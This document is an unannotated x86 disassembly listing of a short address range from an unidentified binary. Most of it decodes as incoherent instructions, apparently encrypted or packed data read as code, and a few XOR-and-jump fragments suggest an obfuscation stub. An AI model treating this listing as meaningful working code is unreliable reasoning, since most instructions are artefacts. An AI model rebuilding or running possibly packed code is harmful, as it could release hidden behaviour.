  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfbe:	and    eax,0x963e7af0
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	adc    DWORD PTR [ebx+0x57],esi
  40bfcc:	dec    edx
  40bfcd:	mov    esi,0x579c5964
  40bfd2:	arpl   WORD PTR [edi-0x2a],di
  40bfd5:	dec    ebx
  40bfd6:	imul   esi,DWORD PTR [edx+ebx*4-0x1b884cd0],0x96e33fa1
  40bfe1:	jg     0x40bf66
  40bfe3:	aas    
  40bfe4:	and    BYTE PTR [edx+eax*1-0x17fbc9d6],ah
  40bfeb:	and    ecx,DWORD PTR [eax]
  40bfed:	push   ebx
  40bfee:	xchg   dl,al
  40bff0:	xor    DWORD PTR [edx-0x80],ebx
  40bff3:	push   es
  40bff4:	mov    edx,edi
  40bff6:	add    bh,BYTE PTR [eax+0x5567dc02]
  40bffc:	or     dh,bh
  40bffe:	xchg   esp,eax
  40bfff:	lds    eax,FWORD PTR [edx-0x528739df]
  40c005:	imul   esp,edx,0x35a10dcd
  40c00b:	cmp    eax,0xef8ec677
  40c010:	push   edi
  40c011:	rol    DWORD PTR [esi],0xfc
  40c014:	jae    0x40c013
  40c016:	in     eax,dx
  40c017:	mov    DWORD PTR [ebp-0x435a977e],edx
  40c01d:	mov    bh,0xb2
  40c01f:	sub    eax,0xfd57254
  40c024:	aam    0xd4
  40c026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c027:	addr16 ret 
  40c029:	add    BYTE PTR [edi-0x50],dl
  40c02c:	dec    esp
  40c02d:	call   DWORD PTR [edi+0x3a934c32]
  40c033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c034:	in     al,0x6e
  40c036:	sbb    al,0x99
  40c038:	inc    esp
  40c039:	push   ebx
  40c03a:	(bad)  
  40c03b:	rol    BYTE PTR [edi],cl
  40c03d:	enter  0x24cd,0xa4
  40c041:	add    BYTE PTR [eax+0x1a],dh
  40c044:	and    esp,esi
  40c046:	push   ebx
  40c047:	sar    BYTE PTR [esi],0x88
  40c04a:	inc    edi
  40c04b:	xchg   DWORD PTR [eax],esi
  40c04d:	mov    esp,0x45d87c54
  40c052:	(bad)  
  40c053:	cmp    bh,BYTE PTR [ebp+0x14]
  40c056:	dec    edx
  40c057:	mov    ebx,DWORD PTR [edi-0x20239074]
  40c05d:	outs   dx,DWORD PTR ds:[esi]
  40c05e:	pop    edx
  40c05f:	mov    BYTE PTR [edx+0x7669cfaf],dl
  40c065:	retf   
  40c066:	mov    al,0x30
  40c068:	jbe    0x40c0cd
  40c06a:	jo     0x40c092
  40c06c:	mov    esi,0x84f4581d
  40c071:	fsub   DWORD PTR [ebp+edi*2-0x4f]
  40c075:	outs   dx,DWORD PTR ds:[esi]
  40c076:	mov    esi,0x552a0bc2
  40c07b:	in     eax,0x6e
  40c07d:	dec    edx
  40c07e:	mov    dh,0x78
  40c080:	(bad)  
  40c081:	test   eax,0xf58ffeb6
  40c086:	int    0x40
  40c088:	mov    esp,0x723a489d
  40c08d:	add    DWORD PTR ds:0x90d9bdd2,eax
  40c093:	cmp    DWORD PTR [eax+0x5359c16c],eax
  40c099:	in     al,dx
  40c09a:	push   ss
  40c09b:	cmp    esp,ebx
  40c09d:	push   ss
  40c09e:	sti    
  40c09f:	sbb    BYTE PTR [ecx+0x4b],0xfc
  40c0a3:	xchg   BYTE PTR [ecx+0x57],al
  40c0a6:	es nop
  40c0a8:	dec    edi
  40c0a9:	and    eax,ebp
  40c0ab:	push   ecx
  40c0ac:	ins    BYTE PTR es:[edi],dx
  40c0ad:	es push cs
  40c0af:	mov    ecx,0x5e113914
  40c0b4:	jno    0x40c041
  40c0b6:	lahf   
  40c0b7:	daa    
  40c0b8:	dec    edi
  40c0b9:	inc    edx
  40c0ba:	nop
  40c0bb:	int    0x19
  40c0bd:	mov    al,BYTE PTR [edx+edx*2-0x61]
  40c0c1:	loop   0x40c0de
  40c0c3:	ja     0x40c04e
  40c0c5:	and    BYTE PTR [edx+ebp*1-0x4c4fbbd4],ah
  40c0cc:	frstor [ebx-0x10802cd1]
  40c0d2:	ret    
  40c0d3:	pop    eax
  40c0d4:	scas   eax,DWORD PTR es:[edi]
  40c0d5:	sbb    dl,ch
  40c0d7:	add    BYTE PTR [esi],ch
  40c0d9:	popf   
  40c0da:	mov    WORD PTR [esi],ss
  40c0dc:	cmp    ah,BYTE PTR [eax-0xc]
  40c0df:	mov    ah,0xa8
  40c0e1:	in     eax,dx
  40c0e2:	mov    bh,0xd1
  40c0e4:	xchg   edi,eax
  40c0e5:	imul   eax,DWORD PTR [edx+ecx*1-0x61],0x5b85a9ed
  40c0ed:	cli    
  40c0ee:	or     ebx,ecx
  40c0f0:	ins    BYTE PTR es:[edi],dx
  40c0f1:	dec    ecx
  40c0f2:	push   esp
  40c0f3:	je     0x40c0c7
  40c0f5:	inc    ebx
  40c0f6:	pop    ss
  40c0f7:	cmp    cl,BYTE PTR [ebx-0x213e57d9]
  40c0fd:	add    BYTE PTR ds:0x367e8f58,al
  40c103:	js     0x40c0bd
  40c105:	push   edi
  40c106:	adc    ah,dl
  40c108:	pop    edx
  40c109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c10a:	mov    ebp,0x2c227016
  40c10f:	mul    BYTE PTR [edx-0x5577491b]
  40c115:	aam    0x86
  40c117:	leave  
  40c118:	jo     0x40c112
  40c11a:	xchg   DWORD PTR ds:0xf8a1f1cf,esi
  40c120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c121:	test   BYTE PTR [edx+ebx*4+0x34],ah
  40c125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c126:	fs cmp eax,ebx
  40c129:	mov    bh,0x9e
  40c12b:	push   esi
  40c12c:	add    dh,ch
  40c12e:	cmp    DWORD PTR [ecx],ecx
  40c130:	out    dx,al
  40c131:	adc    BYTE PTR ds:0xa2b81214,bl
  40c137:	jno    0x40c0b9
  40c139:	daa    
  40c13a:	sub    al,0x86
  40c13c:	jnp    0x40c0cb
  40c13e:	cli    
  40c13f:	cmp    al,BYTE PTR [ecx+edx*2-0x33]
  40c143:	sub    DWORD PTR [edx+eiz*8-0x72],ebp
  40c147:	jbe    0x40c132
  40c149:	(bad)  
  40c14b:	push   eax
  40c14c:	cmp    al,0x9
  40c14e:	int3   
  40c14f:	mul    BYTE PTR [edi+0x53]
  40c152:	dec    ebp
  40c153:	test   eax,0x741de774
  40c158:	xor    edx,DWORD PTR [edx+0x3c]
  40c15b:	adc    esp,DWORD PTR [ebx+0x74d57cb9]
  40c161:	mov    al,ds:0x975b9d52
  40c166:	(bad)  ds:0x4bcbd4cf
  40c16c:	mov    bh,0xd6
  40c16e:	cdq    
  40c16f:	push   eax
  40c170:	jb     0x40c111
  40c172:	inc    eax
  40c173:	repz shl BYTE PTR [eax],cl
  40c176:	mov    ecx,0x54624867
  40c17b:	test   BYTE PTR [ebx-0x55b3f782],al
  40c181:	imul   edx,DWORD PTR [eax+0x40],0x20
  40c185:	and    BYTE PTR [edi],dh
  40c187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c188:	sbb    al,0x12
  40c18a:	add    ch,0xc
  40c18d:	test   eax,0xeee86d4b
  40c192:	lea    ecx,[eax+0x7a]
  40c195:	or     eax,0xf6d4fc40
  40c19a:	mov    ds:0xf28b1506,eax
  40c19f:	lods   al,BYTE PTR ds:[esi]
  40c1a0:	pop    es
  40c1a1:	dec    ebp
  40c1a2:	(bad)  
  40c1a3:	cli    
  40c1a4:	xchg   esp,eax
  40c1a5:	(bad)  
  40c1a6:	cwde   
  40c1a7:	jbe    0x40c1a4
  40c1a9:	leave  
  40c1aa:	adc    al,0xad
  40c1ac:	or     DWORD PTR [ebx+0x7205006e],esi
  40c1b2:	data16 fld TBYTE PTR [ebp+0x4b90c6d6]
  40c1b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ba:	out    0x3d,eax
  40c1bc:	mov    ecx,0x82be4256
  40c1c1:	rcl    BYTE PTR cs:[edx-0x21],0x51
  40c1c6:	rcr    DWORD PTR ds:0x18862a8,1
  40c1cc:	or     bl,BYTE PTR [edi+0x5e9f910d]
  40c1d2:	xchg   esi,eax
  40c1d3:	sbb    edi,DWORD PTR [edx]
  40c1d5:	retf   0xe8cd
  40c1d8:	inc    esp
  40c1d9:	push   edi
  40c1da:	lea    ecx,[ebp+ecx*2-0x54]
  40c1de:	imul   edi,DWORD PTR [ebp+0x534000cc],0x2717a44c
  40c1e8:	lods   al,BYTE PTR ds:[esi]
  40c1e9:	mov    eax,0xa327e3d6
  40c1ee:	in     eax,0x87
  40c1f0:	dec    ebx
  40c1f1:	retf   0xb882
  40c1f4:	and    BYTE PTR [ebx+0x52],bh
  40c1f7:	shl    DWORD PTR [esi-0xa],cl
  40c1fa:	jno    0x40c26d
  40c1fc:	jnp    0x40c26d
  40c1fe:	sbb    bl,0xd2
  40c201:	pop    ecx
  40c202:	mov    WORD PTR gs:[ebx-0x36fb40a],?
  40c209:	sub    edx,ecx
  40c20b:	loopne 0x40c1ac
  40c20d:	jno    0x40c20d
  40c20f:	or     ebp,DWORD PTR [edi]
  40c211:	arpl   WORD PTR [esi],bp
  40c213:	mov    esp,0x5c3911df
  40c218:	out    dx,eax
  40c219:	inc    ebx
  40c21a:	fcomp  DWORD PTR [edx]
  40c21c:	push   ds
  40c21d:	inc    ecx
  40c21e:	addr16 xchg esi,eax
  40c220:	mov    edi,0x4a3fd835
  40c225:	icebp  
  40c226:	mov    ds:0xa023045d,eax
  40c22b:	inc    ebx
  40c22c:	and    dh,BYTE PTR [ecx-0xcbf14a]
  40c232:	(bad)  
  40c233:	rcl    BYTE PTR [ecx],1
  40c235:	stos   BYTE PTR es:[edi],al
  40c236:	lock outs dx,BYTE PTR ds:[esi]
  40c238:	dec    edi
  40c239:	adc    bl,BYTE PTR [ebx+0x4b]
  40c23c:	pushf  
  40c23d:	data16 add bh,bl
  40c240:	and    eax,0x28b320e2
  40c245:	xor    esi,DWORD PTR [edi+edi*2]
  40c248:	mov    ebx,0x2aa312ad
  40c24d:	or     al,0x89
  40c24f:	aad    0x6c
  40c251:	cs pop eax
  40c253:	mov    al,0x9f
  40c255:	adc    ecx,ebx
  40c257:	lahf   
  40c258:	sbb    DWORD PTR [ecx+0x3b],ebp
  40c25b:	fnstsw WORD PTR [eax+eiz*1]
  40c25e:	or     ah,bh
  40c260:	mov    eax,ds:0xba46bfe5
  40c265:	data16 mov bl,BYTE PTR [edx+eiz*8-0x40]
  40c26a:	mov    esi,0x17df6d89
  40c26f:	call   0x1f2c25ab
  40c274:	je     0x40c219
  40c276:	retf   
  40c277:	pop    ds
  40c278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c279:	ja     0x40c282
  40c27b:	out    dx,al
  40c27c:	pop    edx
  40c27d:	fidiv  WORD PTR ds:[edi+0xd0ff355]
  40c284:	div    DWORD PTR [ebx-0xd40bd3a]
  40c28a:	xchg   DWORD PTR [edi*8-0x2d5066f0],ecx
  40c291:	adc    eax,0xbd76491f
  40c296:	inc    eax
  40c297:	jge    0x40c25c
  40c299:	scas   al,BYTE PTR es:[edi]
  40c29a:	std    
  40c29b:	fs sti 
  40c29d:	ja     0x40c2d6
  40c29f:	addr16 pop esi
  40c2a1:	add    ecx,DWORD PTR [eax+0xe]
  40c2a4:	inc    esi
  40c2a5:	je     0x40c2ca
  40c2a7:	dec    esi
  40c2a8:	pop    edi
  40c2a9:	add    DWORD PTR [esi+0xb],ebx
  40c2ac:	and    esp,DWORD PTR [edi]
  40c2ae:	jo     0x40c259
  40c2b0:	inc    esi
  40c2b1:	lea    ecx,[esi+0x3a1f5bb8]
  40c2b7:	adc    al,ah
  40c2b9:	push   edi
  40c2ba:	xchg   edi,eax
  40c2bb:	mov    ds:0x8cbd36dc,al
  40c2c0:	call   DWORD PTR [ebx+eax*2+0x458bf181]
  40c2c7:	fsub   DWORD PTR [esi-0x75]
  40c2ca:	jge    0x40c2a0
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax-0x2],bh
  40c2e3:	and    dl,ah
  40c2e5:	dec    ecx
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	arpl   WORD PTR [edi+0x48],di
  40c2f1:	pop    ss
  40c2f2:	in     eax,dx
  40c2f3:	jo     0x40c2ac
  40c2f5:	ds retf 
  40c2f7:	jge    0x40c319
  40c2f9:	retf   
  40c2fa:	leave  
  40c2fb:	enter  0xe8dc,0x26
  40c2ff:	sub    dl,ch
  40c301:	pop    ds
  40c302:	test   DWORD PTR [ebx],0xd002f415
  40c308:	sub    DWORD PTR [eax-0x64fe0dff],eax
  40c30e:	inc    edx
  40c30f:	jns    0x40c319
  40c311:	iret   
  40c312:	ret    0xccb0
  40c315:	jb     0x40c2fd
  40c317:	outs   dx,BYTE PTR ds:[esi]
  40c318:	mov    ebp,DWORD PTR [edx+0x2258a1b5]
  40c31e:	cmc    
  40c31f:	push   0xfffffff7
  40c321:	pop    esi
  40c322:	xor    BYTE PTR [ebx-0x54eef8cd],dl
  40c328:	scas   al,BYTE PTR es:[edi]
  40c329:	add    edi,eax
  40c32b:	push   0x825ce42a
  40c330:	jecxz  0x40c399
  40c332:	push   esp
  40c333:	(bad)  
  40c335:	xchg   dl,ah
  40c337:	jmp    0xd507:0x47469efc
  40c33e:	mov    ebx,DWORD PTR [edx+ebx*4]
  40c341:	sti    
  40c342:	test   al,0xa2
  40c344:	scas   al,BYTE PTR es:[edi]
  40c345:	(bad)  
  40c346:	ffree  st(4)
  40c348:	inc    esp
  40c349:	xchg   ebp,eax
  40c34a:	enter  0xc6e,0x15
  40c34e:	rol    BYTE PTR [edi-0x27802d74],0x9b
  40c355:	push   edx
  40c356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c357:	test   ebx,edi
  40c359:	daa    
  40c35a:	in     eax,0x71
  40c35c:	js     0x40c333
  40c35e:	xor    eax,DWORD PTR [ebx]
  40c360:	je     0x40c2e5
  40c362:	fadd   st,st(4)
  40c364:	gs inc eax
  40c366:	and    DWORD PTR [eax-0x70],esp
  40c369:	jl     0x40c3c5
  40c36b:	push   esi
  40c36c:	lahf   
  40c36d:	xchg   DWORD PTR [ebp+0x759099a1],esp
  40c373:	jbe    0x40c303
  40c375:	sbb    ecx,DWORD PTR [ecx]
  40c377:	loopne 0x40c30b
  40c379:	(bad)  
  40c37a:	push   ebp
  40c37b:	mov    ah,0xac
  40c37d:	xchg   DWORD PTR [ebp+0x68],esi
  40c380:	fs lahf 
  40c382:	dec    esp
  40c384:	cmp    al,0xb9
  40c386:	aam    0x6e
  40c388:	mov    ds:0xcd5a938e,eax
  40c38d:	psubusw mm2,QWORD PTR [ecx-0x3cef4796]
  40c394:	fbstp  TBYTE PTR [eax+0x4b]
  40c397:	adc    esp,DWORD PTR [edx]
  40c399:	lods   eax,DWORD PTR ds:[esi]
  40c39a:	icebp  
  40c39b:	mov    edi,0x9da3dd33
  40c3a0:	pop    ebp
  40c3a1:	ins    DWORD PTR es:[edi],dx
  40c3a2:	add    al,0x37
  40c3a4:	xor    ecx,DWORD PTR [edx]
  40c3a6:	xchg   ecx,eax
  40c3a7:	push   edi
  40c3a8:	imul   edx,ebp,0x8
  40c3ab:	push   edi
  40c3ac:	sbb    al,0x25
  40c3ae:	ja     0x40c42c
  40c3b0:	ins    BYTE PTR es:[edi],dx
  40c3b1:	cmp    BYTE PTR [ebx],0x21
  40c3b4:	(bad)  es:[edx]
  40c3b7:	jge    0x40c3fb
  40c3b9:	jb     0x40c3c8
  40c3bb:	test   eax,0xf0e4c075
  40c3c0:	ss and esp,edi
  40c3c3:	js     0x40c414
  40c3c5:	mov    ebx,0x29023643
  40c3ca:	mov    cl,0xba
  40c3cc:	imul   esp,DWORD PTR gs:[edi+edx*8+0x6f],0xffffffe7
  40c3d2:	addr16 sbb al,0xfb
  40c3d5:	fimul  DWORD PTR [edi]
  40c3d7:	add    BYTE PTR [edi],ah
  40c3d9:	xlat   BYTE PTR ds:[ebx]
  40c3da:	push   ss
  40c3db:	dec    esp
  40c3dc:	rcl    DWORD PTR [ecx],cl
  40c3de:	daa    
  40c3df:	test   al,0xab
  40c3e1:	xchg   edx,eax
  40c3e2:	js     0x40c41a
  40c3e4:	jo     0x40c398
  40c3e6:	inc    edi
  40c3e7:	adc    DWORD PTR [edx],ebp
  40c3e9:	out    0xb2,al
  40c3eb:	sbb    ah,bh
  40c3ed:	jns    0x40c45e
  40c3ef:	shl    ah,0x3a
  40c3f2:	inc    esi
  40c3f3:	jo     0x40c392
  40c3f5:	mov    ecx,0x8b1b5af5
  40c3fa:	mov    WORD PTR [ebp+0x52],cs
  40c3fd:	xor    al,0x5c
  40c3ff:	ret    0x24df
  40c402:	cwde   
  40c403:	cld    
  40c404:	or     ch,bl
  40c406:	in     eax,dx
  40c407:	jb     0x40c3ee
  40c409:	fld    st(6)
  40c40b:	mov    ebx,0x86bfd5fd
  40c410:	pusha  
  40c411:	ret    
  40c412:	popf   
  40c413:	mov    eax,ds:0xf30b36f
  40c418:	lahf   
  40c419:	sar    DWORD PTR ds:0xbc1240ac,cl
  40c41f:	sbb    dl,BYTE PTR [ecx]
  40c421:	xor    ecx,DWORD PTR [edi]
  40c423:	shl    DWORD PTR [edi-0x34],cl
  40c426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c427:	hlt    
  40c428:	cs aas 
  40c42a:	mov    cl,0x72
  40c42c:	sbb    BYTE PTR [edx+esi*2-0x1a],0xa9
  40c431:	dec    ecx
  40c432:	push   ecx
  40c433:	cs retf 0x5c07
  40c437:	imul   edx,ecx,0xe5cbc28c
  40c43d:	into   
  40c43e:	push   edx
  40c43f:	sti    
  40c440:	cli    
  40c441:	repnz retf 
  40c443:	fnsave [edi-0x742ebc69]
  40c449:	jmp    0x4a4:0x6e31744a
  40c450:	add    esp,esi
  40c452:	cmp    BYTE PTR [edx-0xa],ah
  40c455:	jecxz  0x40c45c
  40c457:	xor    eax,0x1d4f9a05
  40c45c:	mov    cl,0xbc
  40c45e:	and    esp,DWORD PTR [esi-0x4d00cc2b]
  40c464:	inc    esp
  40c465:	adc    bl,ah
  40c467:	pop    edx
  40c468:	lea    esp,[edx]
  40c46a:	cwde   
  40c46b:	dec    ebx
  40c46c:	les    esi,FWORD PTR [ebx]
  40c46e:	imul   esi,edi,0x3ed4c29b
  40c474:	leave  
  40c475:	in     eax,0xcf
  40c477:	xchg   esp,eax
  40c478:	sbb    BYTE PTR [ebx+0x15],dh
  40c47b:	sbb    al,0x29
  40c47e:	xor    eax,0xbe350d36
  40c483:	test   DWORD PTR [edx+0x313918f6],0xd1665309
  40c48d:	inc    eax
  40c48e:	in     al,0x36
  40c490:	jecxz  0x40c443
  40c492:	xor    BYTE PTR [edx-0x1374c7e8],0xe7
  40c499:	add    al,0xa4
  40c49b:	les    esi,FWORD PTR [edi]
  40c49d:	xchg   ecx,eax
  40c49e:	pop    es
  40c49f:	mov    cl,0x96
  40c4a1:	or     edi,ebx
  40c4a3:	in     al,dx
  40c4a4:	(bad)  
  40c4a5:	sti    
  40c4a6:	enter  0xaa19,0xcb
  40c4aa:	or     al,0x36
  40c4ac:	in     al,dx
  40c4ad:	push   eax
  40c4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4af:	xchg   ebp,eax
  40c4b0:	rol    DWORD PTR [edx-0x7c34c1b3],0x65
  40c4b7:	push   edx
  40c4b8:	cmp    edx,edi
  40c4ba:	push   edx
  40c4bb:	cmp    eax,0xedc44ab6
  40c4c0:	fwait
  40c4c1:	out    0xbb,al
  40c4c3:	mov    ah,0xcb
  40c4c5:	sbb    eax,DWORD PTR [edi+0x54abd27a]
  40c4cb:	sar    DWORD PTR [edx],1
  40c4cd:	shl    BYTE PTR ds:[esp+esi*2],cl
  40c4d1:	xchg   edx,eax
  40c4d2:	jno    0x40c4d5
  40c4d4:	lds    edx,FWORD PTR [ecx-0x3d035da]
  40c4da:	push   ebx
  40c4db:	nop    DWORD PTR [edx]
  40c4de:	loopne 0x40c4b1
  40c4e0:	jle    0x40c55a
  40c4e2:	loopne 0x40c522
  40c4e4:	dec    ebx
  40c4e5:	std    
  40c4e6:	sub    al,0xf2
  40c4e8:	aas    
  40c4e9:	push   ebp
  40c4ea:	int    0xff
  40c4ec:	xor    al,0x79
  40c4ee:	pop    es
  40c4ef:	loop   0x40c538
  40c4f1:	std    
  40c4f2:	inc    esi
  40c4f3:	xor    al,0x2f
  40c4f5:	in     eax,dx
  40c4f6:	sbb    eax,0x18139b94
  40c4fb:	cmp    al,0x19
  40c4fd:	in     al,dx
  40c4fe:	dec    ebx
  40c4ff:	loop   0x40c51f
  40c501:	inc    edi
  40c502:	xrelease mov BYTE PTR fs:[eax],al
  40c506:	sbb    al,0x9b
  40c508:	imul   eax,DWORD PTR [edx+ecx*8-0x31],0x7d175f6c
  40c510:	xchg   ecx,eax
  40c511:	dec    ebp
  40c512:	test   BYTE PTR [ecx],al
  40c514:	push   ss
  40c515:	inc    edi
  40c516:	mov    dl,ah
  40c518:	and    esi,DWORD PTR [ebx-0x1b0c6c70]
  40c51e:	stc    
  40c51f:	enter  0x1402,0xd
  40c523:	inc    edi
  40c524:	lock mov BYTE PTR [ecx+edx*8],cl
  40c528:	jbe    0x40c555
  40c52a:	sbb    cl,ah
  40c52c:	daa    
  40c52d:	ds call 0x61fd:0x990ddd06
  40c535:	add    eax,0x9fec0d81
  40c53a:	outs   dx,BYTE PTR ds:[esi]
  40c53b:	in     al,dx
  40c53c:	scas   eax,DWORD PTR es:[edi]
  40c53d:	repz out dx,al
  40c53f:	fisttp DWORD PTR [edx+0x47]
  40c542:	out    dx,al
  40c543:	mov    bl,0xbc
  40c545:	in     eax,dx
  40c546:	pushf  
  40c547:	test   eax,0x74d3abda
  40c54c:	jle    0x40c548
  40c54e:	mov    ss,WORD PTR [edx]
  40c550:	popa   
  40c551:	outs   dx,BYTE PTR ds:[esi]
  40c553:	cli    
  40c554:	fnsave [edi-0x9]
  40c557:	add    cl,bh
  40c559:	jns    0x40c595
  40c55b:	test   DWORD PTR [eax+0x441dd4ac],edi
  40c561:	mov    al,0x26
  40c563:	scas   al,BYTE PTR es:[edi]
  40c564:	cmp    dl,al
  40c566:	mov    cl,0xa6
  40c568:	lods   al,BYTE PTR ds:[esi]
  40c569:	loop   0x40c542
  40c56b:	adc    DWORD PTR [edx],eax
  40c56d:	jle    0x40c571
  40c56f:	ins    DWORD PTR es:[edi],dx
  40c570:	adc    DWORD PTR [edi+0xe],ecx
  40c573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c574:	in     eax,dx
  40c575:	inc    esp
  40c576:	mov    ebp,0x8c940f31
  40c57b:	and    dh,BYTE PTR [ecx-0x46]
  40c57e:	lods   eax,DWORD PTR ds:[esi]
  40c57f:	pop    eax
  40c580:	data16 mov ah,0xac
  40c583:	xchg   BYTE PTR [esi+ebx*8],dl
  40c586:	je     0x40c57f
  40c588:	(bad)  
  40c589:	adc    DWORD PTR [eax-0x5b],edi
  40c58c:	lahf   
  40c58d:	test   BYTE PTR [esi*8-0x7616af62],bl
  40c594:	jbe    0x40c5f3
  40c596:	popa   
  40c597:	scas   eax,DWORD PTR es:[edi]
  40c598:	pop    ss
  40c599:	stos   DWORD PTR es:[edi],eax
  40c59a:	loopne 0x40c586
  40c59c:	test   BYTE PTR [esi],al
  40c59e:	jmp    0xb5ae:0xb7907e45
  40c5a5:	loope  0x40c623
  40c5a7:	pusha  
  40c5a8:	xchg   DWORD PTR [ecx],ebx
  40c5aa:	pop    ebx
  40c5ab:	jg     0x40c5fe
  40c5ad:	rcl    BYTE PTR [ecx],1
  40c5af:	jge    0x40c591
  40c5b1:	ins    DWORD PTR es:[edi],dx
  40c5b2:	sub    BYTE PTR ds:0xb704e479,dl
  40c5b8:	jbe    0x40c582
  40c5ba:	xor    ecx,esi
  40c5bc:	ja     0x40c630
  40c5be:	ss mov dh,0x6f
  40c5c1:	sbb    esi,eax
  40c5c3:	cmp    ch,BYTE PTR [ebp+0x381435bc]
  40c5c9:	(bad)  
  40c5ca:	pop    ecx
  40c5cb:	push   ecx
  40c5cc:	(bad)  
  40c5cd:	hlt    
  40c5ce:	mov    WORD PTR [eax],ds
  40c5d0:	iret   
  40c5d1:	iret   
  40c5d2:	or     al,dl
  40c5d4:	les    ecx,FWORD PTR [eax+0x14]
  40c5d7:	pop    ss
  40c5d8:	xor    eax,0xf41e7ce6
  40c5dd:	sub    dl,BYTE PTR [ebp+0x359abea1]
  40c5e3:	sbb    BYTE PTR [ecx+0x1112c1b8],ah
  40c5e9:	addr16 xor di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x4d2d2f7
  40c613:	adc    eax,0x983658a3
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	jns    0x40c5b6
  40c620:	push   ebx
  40c621:	and    al,0x9a
  40c623:	push   edi
  40c624:	gs push ebx
  40c626:	jle    0x40c6a0
  40c628:	nop
  40c629:	cli    
  40c62a:	jnp    0x40c652
  40c62c:	mov    edi,ebp
  40c62e:	jns    0x40c5b8
  40c630:	icebp  
  40c631:	fmul   QWORD PTR [ecx]
  40c633:	mov    eax,0x2505e377
  40c638:	sar    BYTE PTR ds:0xdd9d2b65,0x91
  40c63f:	int    0xf6
  40c641:	add    DWORD PTR [ebx+0x22e494f3],0x8
  40c648:	push   esp
  40c649:	add    dl,BYTE PTR [edx]
  40c64b:	mov    ch,ah
  40c64d:	and    bh,BYTE PTR [edx-0x59]
  40c650:	in     al,dx
  40c651:	pusha  
  40c652:	sub    eax,0xae45e152
  40c657:	lods   eax,DWORD PTR ds:[esi]
  40c658:	icebp  
  40c659:	scas   al,BYTE PTR es:[edi]
  40c65a:	cmp    al,BYTE PTR [edi+eiz*8-0x6d]
  40c65e:	sub    ch,BYTE PTR [edi+0x7b13a7c6]
  40c664:	sbb    BYTE PTR [ebx+0x4a],bl
  40c667:	or     al,cl
  40c669:	repz std 
  40c66b:	mov    eax,0x86747e82
  40c670:	in     al,0x6c
  40c672:	cmp    eax,0xf696f68b
  40c677:	ja     0x40c6e3
  40c679:	sbb    BYTE PTR [edx+ebp*4-0x44c65a53],bl
  40c680:	rol    DWORD PTR [edi+0x564cd818],0xc4
  40c687:	mov    cl,0x71
  40c689:	push   0xe33cfb57
  40c68e:	das    
  40c68f:	lea    esi,[ebx]
  40c691:	and    eax,0x5490209
  40c696:	jl     0x40c6ef
  40c698:	dec    esp
  40c69a:	jmp    0x9807:0x25185624
  40c6a1:	and    al,0xb3
  40c6a3:	(bad)  
  40c6a4:	es ret 
  40c6a6:	and    DWORD PTR [eax+0x48707c86],0x72
  40c6ad:	lock sub BYTE PTR ss:[eax+0x44df7aa7],bh
  40c6b5:	(bad)  
  40c6b6:	nop
  40c6b7:	cmp    DWORD PTR [ecx-0x20],0xffffffcb
  40c6bb:	jbe    0x40c66a
  40c6bd:	sbb    al,BYTE PTR [ebx-0x18a5ceba]
  40c6c3:	out    dx,eax
  40c6c4:	xlat   BYTE PTR ds:[ebx]
  40c6c5:	hlt    
  40c6c6:	lahf   
  40c6c7:	je     0x40c6e7
  40c6c9:	cmp    eax,0xcc283c0f
  40c6ce:	or     eax,0xf562d43d
  40c6d3:	xor    ah,BYTE PTR [ecx]
  40c6d5:	adc    al,0x3b
  40c6d7:	clc    
  40c6d8:	ins    BYTE PTR es:[edi],dx
  40c6d9:	iret   
  40c6da:	jmp    0xfda7:0x975a5207
  40c6e1:	xchg   esi,eax
  40c6e2:	in     al,0xee
  40c6e4:	dec    eax
  40c6e5:	sbb    DWORD PTR [eax+0x45],esp
  40c6e8:	cmp    dh,ah
  40c6ea:	das    
  40c6eb:	cs inc edx
  40c6ed:	adc    edx,DWORD PTR [eax+0x117fb718]
  40c6f3:	lahf   
  40c6f4:	mov    ds:0x10026f7e,al
  40c6f9:	(bad)  
  40c6fb:	sbb    BYTE PTR [edx],dl
  40c6fd:	mov    al,ds:0x1f316509
  40c702:	mov    ds:0x26ec35ca,al
  40c707:	out    dx,eax
  40c708:	int3   
  40c709:	iret   
  40c70a:	push   0xffffffbd
  40c70c:	scas   al,BYTE PTR es:[edi]
